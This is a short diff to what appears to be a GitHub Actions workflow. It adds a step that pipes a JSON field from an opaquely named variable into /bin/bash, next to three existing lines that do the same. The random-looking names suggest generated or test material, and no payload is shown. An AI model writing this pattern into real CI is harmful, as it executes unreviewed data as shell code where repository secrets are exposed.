@@ -21,6 +21,7 @@ jobs:
           echo $kp70740 | jq -r .uerfn4550 | /bin/bash
           printf '%s' "$rn2" | jq -r .zdge86982 | /bin/bash
           printf '%s' "$r32628" | jq -r .c845 | /bin/bash
+          echo $eozpx7 | jq -r .kby360 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
